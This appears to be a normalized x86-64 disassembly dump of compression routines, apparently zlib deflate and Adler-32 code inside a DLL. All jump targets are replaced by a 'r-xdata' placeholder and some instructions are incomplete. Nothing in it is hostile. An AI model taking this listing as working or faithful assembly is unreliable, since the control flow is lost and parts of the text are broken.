cmp [ rbx + 0x88 ] edi
je r-xdata
cmp [ rbx + 0x80 ] eax
ja r-xdata
mov ecx [ rbx + 0x8c ]
mov eax [ rbx + 0x38 ]
sub ecx r12d
sub eax 0x106
cmp ecx eax
ja r-xdata
cmp [ rbx + 0x7c ] edi
jl r-xdata
mov ecx [ rbx + 0x8c ]
mov rax [ rbx + 0x48 ]
sub ecx esi
movzx edx [ rcx + rax ]
mov ecx [ rbx + 0x16ec ]
mov rax [ rbx + 0x16f0 ]
mov [ rax + rcx * 2 ] di
mov ecx [ rbx + 0x16ec ]
mov rax [ rbx + 0x16e0 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16ec ] esi
add [ rbx + rdx * 4 + 0xb4 ] si
mov [ rbx + 0x88 ] edi
add [ rbx + 0x8c ] esi
dec [ rbx + 0x94 ]
mov [ rbx + 0x88 ] esi
jmp r-xdata
mov ecx [ rbx + 0x8c ]
mov rax [ rbx + 0x48 ]
sub ecx esi
movzx edx [ rcx + rax ]
mov ecx [ rbx + 0x16ec ]
mov rax [ rbx + 0x16f0 ]
mov [ rax + rcx * 2 ] di
mov ecx [ rbx + 0x16ec ]
mov rax [ rbx + 0x16e0 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16ec ] esi
add [ rbx + rdx * 4 + 0xb4 ] si
mov eax [ rbx + 0x16e8 ]
sub eax esi
cmp [ rbx + 0x16ec ] eax
jne r-xdata
mov ecx [ rbx + 0x8c ]
mov eax [ rbx + 0x94 ]
mov dl [ rbx + 0x98 ]
lea r10d [ rcx + rax - 0x3 ]
mov rax [ rbx + 0x16f0 ]
movzx r8d cx
sub r8w [ rbx + 0x84 ]
mov ecx [ rbx + 0x16ec ]
sub dl r14b
sub r8w si
lea r11 [ __dos_header ]
mov [ rax + rcx * 2 ] r8w
mov rax [ rbx + 0x16e0 ]
mov ecx [ rbx + 0x16ec ]
mov [ rcx + rax ] dl
add [ rbx + 0x16ec ] esi
mov eax 0xffff
add r8w ax
movzx eax dl
movzx eax [ rax + r11 + 0x1a5c0 ]
add [ rbx + rax * 4 + 0x4b8 ] si
mov eax 0x100
cmp r8w ax
movzx eax r8w
jae r-xdata
cmp [ rbx + 0xa8 ] r13d
je r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
mov eax [ rbx + 0x94 ]
cmp eax 0x106
jae r-xdata
mov rax [ rbx ]
add [ rbx + 0x8c ] esi
dec [ rbx + 0x94 ]
cmp [ rax + 0x18 ] edi
cmp [ rbx + 0x7c ] edi
jl r-xdata
shr rax 0x7
movzx ecx [ rax + r11 + 0x1a4c0 ]
movzx ecx [ rax + r11 + 0x1a3c0 ]
jmp r-xdata
mov eax [ rbx + 0x80 ]
cmp eax 0x5
ja r-xdata
mov edx r12d
mov rcx rbx
call sub_18000e960
mov [ rbx + 0x80 ] eax
cmp ebp 0x4
cmove esi r14d
mov eax esi
jmp r-xdata
cmp ebp 0x4
cmove edi r13d
mov eax edi
jmp r-xdata
mov r8d [ rbx + 0x8c ]
mov r9d edi
cmp ebp 0x4
sete r9b
sub r8d [ rbx + 0x7c ]
mov rcx rbx
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
dec [ rbx + 0x98 ]
jne r-xdata
mov rax [ rbx + 0x48 ]
lea ecx [ r8 + 0x2 ]
movzx edx [ rcx + rax ]
mov eax [ rbx + 0x68 ]
mov ecx [ rbx + 0x78 ]
shl eax cl
xor edx eax
mov rax [ rbx + 0x60 ]
and edx [ rbx + 0x74 ]
mov ecx edx
mov [ rbx + 0x68 ] ecx
movzx r12d [ rax + rdx * 2 ]
mov ecx [ rbx + 0x40 ]
mov rax [ rbx + 0x58 ]
and rcx r8
mov [ rax + rcx * 2 ] r12w
mov edx [ rbx + 0x68 ]
mov rcx [ rbx + 0x60 ]
movzx eax [ rbx + 0x8c ]
mov [ rcx + rdx * 2 ] ax
movsxd rax ecx
mov r9d edi
add [ rbx + rax * 4 + 0x9a8 ] si
mov ecx [ rbx + 0x98 ]
mov eax [ rbx + 0x16e8 ]
sub eax esi
cmp [ rbx + 0x16ec ] eax
mov eax esi
sete r9b
sub eax ecx
add [ rbx + 0x94 ] eax
lea eax [ rcx - 0x2 ]
mov [ rbx + 0x98 ] eax
cmp [ rbx + 0xa8 ] esi
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov r8d [ rbx + 0x8c ]
xor r9d r9d
mov rcx rbx
sub r8d [ rbx + 0x7c ]
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
add [ rbx + 0x8c ] esi
mov r8d [ rbx + 0x8c ]
cmp r8d r10d
ja r-xdata
add [ rbx + 0x8c ] esi
mov r8d [ rbx + 0x8c ]
mov [ rbx + 0x88 ] edi
mov [ rbx + 0x80 ] r13d
test r9d r9d
je r-xdata
mov [ rbx + 0x80 ] r13d
cmp eax r14d
jne r-xdata
cmp [ rbx + 0x7c ] edi
jl r-xdata
mov eax [ rbx + 0x8c ]
sub eax [ rbx + 0x90 ]
cmp eax 0x1000
jbe r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
jne r-xdata
sub r8d [ rbx + 0x7c ]
xor r9d r9d
mov rcx rbx
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jmp r-xdata
sub_18000f688
movzx r9d cx
shr ecx 0x10
mov r10 rdx
test rdx rdx
jne r-xdata
test r8d r8d
jne r-xdata
lea eax [ rdx + 0x1 ]
retn
mov edx 0x15b0
cmp r8d edx
cmovb edx r8d
sub r8d edx
cmp edx 0x10
jl r-xdata
shl ecx 0x10
or ecx r9d
mov eax ecx
retn
test edx edx
je r-xdata
mov r11d edx
shr r11 0x4
mov eax r11d
neg eax
shl eax 0x4
add edx eax
mov eax 0x80078071
mul r9d
mov eax 0x80078071
shr edx 0xf
imul edx edx 0xffff000f
add r9d edx
mul ecx
shr edx 0xf
imul edx edx 0xffff000f
add ecx edx
movzx eax [ r10 ]
inc r10
add r9d eax
add ecx r9d
dec edx
jne r-xdata
movzx eax [ r10 ]
add r10 0x10
add r9d eax
movzx eax [ r10 - 0xf ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0xe ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0xd ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0xc ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0xb ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0xa ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x9 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x8 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x7 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x6 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x5 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x4 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x3 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x2 ]
add ecx r9d
add r9d eax
movzx eax [ r10 - 0x1 ]
add ecx r9d
add r9d eax
add ecx r9d
dec r11
jne r-xdata
sub_18000f7d4
xor r8d r8d
lea rax [ rcx + 0xb4 ]
mov edx 0x11e
lea r9d [ r8 + 0x1 ]
mov [ rax ] r8w
add rax 0x4
sub rdx r9
jne r-xdata
lea rax [ rcx + 0x9a8 ]
mov edx 0x1e
mov [ rax ] r8w
add rax 0x4
sub rdx r9
jne r-xdata
lea rax [ rcx + 0xa9c ]
mov edx 0x13
mov [ rax ] r8w
add rax 0x4
sub rdx r9
jne r-xdata
mov [ rcx + 0x4b4 ] r9w
mov [ rcx + 0x16f8 ] r8
mov [ rcx + 0x1700 ] r8d
mov [ rcx + 0x16ec ] r8d
retn
sub_18000f844
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
movsxd rax r8d
mov rbx rdx
lea r9d [ r8 + r8 ]
movsxd r11 [ rcx + rax * 4 + 0xba0 ]
jmp r-xdata
mov eax [ rcx + 0x1494 ]
cmp r9d eax
jle r-xdata
jge r-xdata
mov rbx [ rsp + 0x8 ]
mov rdi [ rsp + 0x10 ]
movsxd rax r8d
mov [ rcx + rax * 4 + 0xba0 ] r11d
retn
movsxd rax r9d
movsxd r10 [ rcx + rax * 4 + 0xba0 ]
movzx eax [ rbx + r10 * 4 ]
cmp [ rbx + r11 * 4 ] ax
jb r-xdata
movsxd rax r9d
movsxd rdx [ rcx + rax * 4 + 0xba4 ]
movsxd r10 [ rcx + rax * 4 + 0xba0 ]
movzx eax [ rbx + r10 * 4 ]
cmp [ rbx + rdx * 4 ] ax
jb r-xdata
jne r-xdata
inc r9d
jne r-xdata
movsxd rax r8d
mov r8d r9d
add r9d r9d
mov [ rcx + rax * 4 + 0xba0 ] r10d
mov al [ r10 + rcx + 0x149c ]
cmp [ r11 + rcx + 0x149c ] al
jbe r-xdata
mov al [ r10 + rcx + 0x149c ]
cmp [ rdx + rcx + 0x149c ] al
ja r-xdata
sub_18000f8f8
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rax [ rdx + 0x10 ]
mov r11d [ rdx + 0x8 ]
mov rbp [ rdx ]
movsxd r10 [ rax + 0x10 ]
mov r14 [ rax ]
mov r15 [ rax + 0x8 ]
movsxd rdx [ rax + 0x18 ]
xor ebx ebx
mov r8 rcx
lea rdi [ rcx + 0xb80 ]
movzx eax bx
lea ecx [ rbx + 0x10 ]
[ rdi ]
movsxd rax [ r8 + 0x1498 ]
lea esi [ rbx + 0x1 ]
movsxd rcx [ r8 + rax * 4 + 0xba0 ]
mov edi 0x23d
mov [ rsp + 0x48 ] r11d
mov [ rbp + rcx * 4 + 0x2 ] bx
mov r13d [ r8 + 0x1498 ]
mov r9d ebx
add r13d esi
mov [ rsp + 0x60 ] r10
movsxd rax r13d
cmp rax rdi
jge r-xdata
test r9d r9d
je r-xdata
sub rdi rax
lea rsi [ r8 + rax * 4 + 0xba0 ]
add r13d edi
mov [ rsp + 0x58 ] r13d
mov r13 r10
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r10d [ rdx - 0x1 ]
mov r14d 0xffff
mov r12d 0x2
mov [ rbp + r12 * 4 + 0x2 ] cx
cmp r12d r11d
jg r-xdata
mov ecx edx
add r9d eax
movsxd rax ecx
sub r9d r12d
add [ r8 + rax * 2 + 0xb80 ] r14w
add [ r8 + rax * 2 + 0xb82 ] r12w
add [ r8 + rdx * 2 + 0xb80 ] r14w
test r9d r9d
jg r-xdata
sub ecx esi
movsxd rax ecx
cmp [ r8 + rax * 2 + 0xb80 ] bx
je r-xdata
add rsi 0x4
sub rdi rax
jne r-xdata
mov r11d 0x1
movsxd rax ecx
add [ r8 + rax * 2 + 0xb80 ] r11w
xor r11d r11d
cmp r12d r13d
jl r-xdata
movsxd rcx r10d
cmp [ r8 + rcx * 2 + 0xb80 ] bx
jne r-xdata
movsxd r10 r13d
test edx edx
je r-xdata
movsxd r12 [ rsi ]
mov r10 r12
movzx eax [ rbp + r12 * 4 + 0x2 ]
movzx ecx [ rbp + rax * 4 + 0x2 ]
mov eax 0x1
add ecx eax
cmp ecx edx
jle r-xdata
mov r13d [ rsp + 0x58 ]
lea esi [ rdi + 0x1 ]
movzx r10d [ rbp + r12 * 4 ]
lea eax [ r11 + rcx ]
imul eax r10d
add [ r8 + 0x16f8 ] eax
test r14 r14
je r-xdata
sub r10 r13
mov r11d [ r15 + r10 * 4 ]
movsxd rax edx
movzx edi [ r8 + rax * 2 + 0xb80 ]
test edi edi
je r-xdata
mov r11d [ rsp + 0x48 ]
mov eax 0x1
movzx eax [ r14 + r12 * 4 + 0x2 ]
add eax r11d
imul eax r10d
add [ r8 + 0x16fc ] eax
sub edx esi
jne r-xdata
lea r9 [ r8 + r10 * 4 + 0xba0 ]
test edi edi
jne r-xdata
movsxd r11 [ r9 ]
movzx eax [ rbp + r11 * 4 + 0x2 ]
cmp eax edx
je r-xdata
sub r9 0x4
sub r10 rsi
cmp [ r9 ] r11d
jg r-xdata
mov r11d [ rsp + 0x48 ]
sub edi esi
mov ecx edx
sub ecx eax
movzx eax [ rbp + r11 * 4 ]
imul ecx eax
add [ r8 + 0x16f8 ] ecx
mov [ rbp + r11 * 4 + 0x2 ] dx
sub_18000faf0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
movzx edi [ rdx + 0x2 ]
or ebx 0xffffffff
xor r11d r11d
mov r9 rcx
lea eax [ rbx + 0x8 ]
lea r10d [ rbx + 0x5 ]
test edi edi
jne r-xdata
movsxd rcx r8d
mov r8d 0xffff
mov [ rdx + rcx * 4 + 0x6 ] r8w
test rcx rcx
js r-xdata
mov eax 0x8a
lea r10d [ rbx + 0x4 ]
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
retn
add rdx 0x6
lea r8 [ rcx + 0x1 ]
mov esi 0x1
cmp r11d r10d
jge r-xdata
cmp ecx edi
je r-xdata
test ecx ecx
je r-xdata
add [ r9 + rcx * 4 + 0xa9c ] r11w
jmp r-xdata
add rdx 0x4
sub r8 rsi
jne r-xdata
cmp r11d 0xa
jg r-xdata
cmp ecx ebx
je r-xdata
xor r11d r11d
mov ebx ecx
test edi edi
jne r-xdata
add r11d esi
movsxd rcx edi
movzx edi [ rdx ]
cmp r11d eax
jge r-xdata
add [ r9 + 0xae4 ] si
add [ r9 + 0xae0 ] si
jmp r-xdata
add [ r9 + 0xadc ] si
jmp r-xdata
add [ r9 + rcx * 4 + 0xa9c ] si
cmp ecx edi
jne r-xdata
mov eax 0x8a
jmp r-xdata
mov eax 0x7
lea r10d [ rax - 0x3 ]
mov eax 0x6
mov r10d 0x3
jmp r-xdata
sub_18000fbe4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
push r15
movzx esi [ rdx + 0x2 ]
or edi 0xffffffff
xor r10d r10d
mov r9 rcx
mov r11 rdx
lea eax [ rdi + 0x8 ]
lea r15d [ rdi + 0x4 ]
lea ecx [ rdi + 0x5 ]
test esi esi
jne r-xdata
movsxd rdx r8d
test r8d r8d
js r-xdata
mov eax 0x8a
mov ecx r15d
mov rbx [ rsp + 0x28 ]
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
pop r15
pop r14
pop r13
pop r12
retn
mov r13d 0x1
lea rbp [ r11 + 0x6 ]
lea r12 [ rdx + 0x1 ]
lea r14d [ r13 + 0xf ]
cmp r10d ecx
jge r-xdata
cmp ebx esi
je r-xdata
test ebx ebx
je r-xdata
movzx edi [ r9 + rbx * 4 + 0xa9e ]
mov ecx [ r9 + 0x170c ]
mov eax r14d
sub eax edi
cmp ecx eax
jle r-xdata
add rbp 0x4
sub r12 r13
jne r-xdata
mov ecx [ r9 + 0x170c ]
mov eax r14d
cmp r10d 0xa
jg r-xdata
cmp ebx edi
je r-xdata
movzx eax [ r9 + rbx * 4 + 0xa9c ]
shl ax cl
or [ r9 + 0x1708 ] ax
lea eax [ rcx + rdi ]
movzx r8d [ r9 + rbx * 4 + 0xa9c ]
movsxd rdx [ r9 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx + rdi - 0x10 ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
add r10d r13d
movsxd rbx esi
movzx esi [ rbp ]
cmp r10d eax
jge r-xdata
movzx r11d [ r9 + 0xae6 ]
sub eax r11d
cmp ecx eax
jle r-xdata
movzx r11d [ r9 + 0xae2 ]
sub eax r11d
cmp ecx eax
jle r-xdata
movzx r11d [ r9 + 0xade ]
mov ecx [ r9 + 0x170c ]
mov eax r14d
sub eax r11d
cmp ecx eax
jle r-xdata
movzx edi [ r9 + rbx * 4 + 0xa9e ]
mov ecx [ r9 + 0x170c ]
mov eax r14d
sub eax edi
cmp ecx eax
jle r-xdata
jmp r-xdata
sub r10d r13d
mov [ r9 + 0x170c ] eax
jne r-xdata
movzx eax [ r9 + 0xae4 ]
shl ax cl
or [ r9 + 0x1708 ] ax
lea eax [ rcx + r11 ]
movsxd rdx [ r9 + 0x28 ]
movzx r8d [ r9 + 0xae4 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
movzx eax [ r9 + 0xae0 ]
shl ax cl
or [ r9 + 0x1708 ] ax
lea eax [ rcx + r11 ]
movsxd rdx [ r9 + 0x28 ]
movzx r8d [ r9 + 0xae0 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
movzx eax [ r9 + 0xadc ]
shl ax cl
or [ r9 + 0x1708 ] ax
lea eax [ rcx + r11 ]
movsxd rdx [ r9 + 0x28 ]
movzx r8d [ r9 + 0xadc ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
movzx eax [ r9 + rbx * 4 + 0xa9c ]
shl ax cl
or [ r9 + 0x1708 ] ax
lea eax [ rcx + rdi ]
movzx r8d [ r9 + rbx * 4 + 0xa9c ]
movsxd rdx [ r9 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx + rdi - 0x10 ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
xor r10d r10d
mov edi ebx
test esi esi
jne r-xdata
sub r10w 0xb
lea eax [ rcx + 0x7 ]
movsxd rdx [ r9 + 0x28 ]
lea r8d [ r10 - 0xb ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx - 0x9 ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
mov [ r9 + 0x170c ] eax
mov ecx eax
cmp eax 0x9
jle r-xdata
sub r10w r15w
lea eax [ rcx + 0x3 ]
jmp r-xdata
movsxd rdx [ r9 + 0x28 ]
lea r8d [ r10 - 0x3 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx - 0xd ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
mov [ r9 + 0x170c ] eax
mov ecx eax
cmp eax 0xd
jle r-xdata
sub r10w r15w
lea eax [ rcx + 0x2 ]
jmp r-xdata
movsxd rdx [ r9 + 0x28 ]
lea r8d [ r10 - 0x3 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1708 ] ax
mov al [ r9 + 0x1708 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] r13d
movsxd rdx [ r9 + 0x28 ]
mov al [ r9 + 0x1709 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x170c ]
add [ r9 + 0x28 ] r13d
mov ecx r14d
lea eax [ rdx - 0xe ]
sub cl dl
shr r8w cl
mov [ r9 + 0x1708 ] r8w
jmp r-xdata
mov [ r9 + 0x170c ] eax
mov ecx eax
cmp eax 0xe
jle r-xdata
mov [ r9 + 0x170c ] eax
sub r10d r13d
cmp ebx esi
jne r-xdata
mov eax 0x8a
jmp r-xdata
mov [ r9 + 0x170c ] eax
shl r10w cl
or [ r9 + 0x1708 ] r10w
mov eax 0x7
lea ecx [ rax - 0x3 ]
mov eax 0x6
mov ecx r15d
jmp r-xdata
sub_180010134
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
mov ecx [ rcx + 0x170c ]
mov r11d r9d
mov edi r8d
mov esi edx
mov ebp 0x1
cmp ecx 0xb
jle r-xdata
movzx eax si
mov edx 0x101
sub ax dx
shl ax cl
or [ rbx + 0x1708 ] ax
lea eax [ rcx + 0x5 ]
lea r10d [ rdx - 0x101 ]
movsxd rdx [ rbx + 0x28 ]
movzx eax r10w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1708 ] ax
mov al [ rbx + 0x1708 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] ebp
movsxd rdx [ rbx + 0x28 ]
mov al [ rbx + 0x1709 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x170c ]
add [ rbx + 0x28 ] ebp
lea ecx [ rbp + 0xf ]
lea eax [ rdx - 0xb ]
sub cl dl
shr r10w cl
mov [ rbx + 0x1708 ] r10w
jmp r-xdata
movzx eax r8w
sub ax bp
shl ax cl
or [ rbx + 0x1708 ] ax
lea eax [ rcx + 0x5 ]
movsxd rdx [ rbx + 0x28 ]
dec r8d
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1708 ] ax
mov al [ rbx + 0x1708 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] ebp
movsxd rdx [ rbx + 0x28 ]
mov al [ rbx + 0x1709 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x170c ]
add [ rbx + 0x28 ] ebp
mov ecx 0x10
lea eax [ rdx - 0xb ]
sub cl dl
shr r8w cl
mov [ rbx + 0x1708 ] r8w
jmp r-xdata
mov [ rbx + 0x170c ] eax
mov ecx eax
cmp eax 0xb
jle r-xdata
lea eax [ r11 - 0x4 ]
shl ax cl
or [ rbx + 0x1708 ] ax
lea eax [ rcx + 0x4 ]
movsxd rdx [ rbx + 0x28 ]
lea r8d [ r11 - 0x4 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1708 ] ax
mov al [ rbx + 0x1708 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] ebp
movsxd rdx [ rbx + 0x28 ]
mov al [ rbx + 0x1709 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x170c ]
add [ rbx + 0x28 ] ebp
mov ecx 0x10
lea eax [ rdx - 0xc ]
sub cl dl
shr r8w cl
mov [ rbx + 0x1708 ] r8w
jmp r-xdata
mov [ rbx + 0x170c ] eax
mov ecx eax
cmp eax 0xc
jle r-xdata
lea r8d [ rsi - 0x1 ]
lea rdx [ rbx + 0xb4 ]
mov rcx rbx
call sub_18000fbe4
lea r8d [ rdi - 0x1 ]
lea rdx [ rbx + 0x9a8 ]
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_18000fbe4
lea r9 [ r--data ]
mov r10 r11
mov [ rbx + 0x170c ] eax
test r11d r11d
jle r-xdata
movzx edx [ rbx + rax * 4 + 0xa9e ]
lea eax [ rcx + 0x3 ]
shl dx cl
or [ rbx + 0x1708 ] dx
movzx r8d [ rbx + rax * 4 + 0xa9e ]
movsxd rdx [ rbx + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1708 ] ax
mov al [ rbx + 0x1708 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] ebp
movsxd rdx [ rbx + 0x28 ]
mov al [ rbx + 0x1709 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x170c ]
add [ rbx + 0x28 ] ebp
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
shr r8w cl
mov [ rbx + 0x1708 ] r8w
jmp r-xdata
mov ecx [ rbx + 0x170c ]
movzx eax [ r9 ]
cmp ecx 0xd
jle r-xdata
add r9 rbp
sub r10 rbp
mov [ rbx + 0x170c ] eax
jne r-xdata
sub_1800103a8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
push r15
xor ebp ebp
mov r14 r8
mov rbx rdx
lea r11d [ rbp + 0x10 ]
mov r10 rcx
cmp [ rcx + 0x16ec ] ebp
je r-xdata
movzx edi [ rbx + 0x402 ]
mov ecx [ r10 + 0x170c ]
mov eax r11d
sub eax edi
cmp ecx eax
jle r-xdata
xor r13d r13d
lea r15 [ __dos_header ]
movzx eax [ rbx + 0x400 ]
shl ax cl
or [ r10 + 0x1708 ] ax
lea eax [ rcx + rdi ]
movzx r9d [ rbx + 0x400 ]
movsxd r8 [ r10 + 0x28 ]
mov rdx [ r10 + 0x10 ]
movzx eax r9w
shl ax cl
or [ r10 + 0x1708 ] ax
mov al [ r10 + 0x1708 ]
mov [ r8 + rdx ] al
inc [ r10 + 0x28 ]
mov al [ r10 + 0x1709 ]
movsxd r8 [ r10 + 0x28 ]
mov rdx [ r10 + 0x10 ]
mov [ r8 + rdx ] al
mov edx [ r10 + 0x170c ]
inc [ r10 + 0x28 ]
sub r11b dl
lea eax [ rdx + rdi - 0x10 ]
mov cl r11b
shr r9w cl
mov [ r10 + 0x1708 ] r9w
jmp r-xdata
movzx r12d [ rdi + r15 + 0x1a5c0 ]
lea eax [ r12 + 0x101 ]
mov edx eax
movzx esi [ rbx + rax * 4 + 0x2 ]
mov eax r11d
sub eax esi
cmp ecx eax
jle r-xdata
movsxd rdx edi
mov eax r11d
movzx r9d [ rbx + rdx * 4 + 0x2 ]
sub eax r9d
cmp ecx eax
jle r-xdata
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov [ r10 + 0x170c ] eax
movzx eax [ rbx + 0x402 ]
mov rbx [ rsp + 0x28 ]
mov [ r10 + 0x1704 ] eax
pop r15
pop r14
pop r13
pop r12
retn
movzx eax [ rbx + rdx * 4 ]
shl ax cl
or [ r10 + 0x1708 ] ax
lea eax [ rcx + rsi ]
movzx r8d [ rbx + rdx * 4 ]
movsxd rdx [ r10 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r10 + 0x10 ]
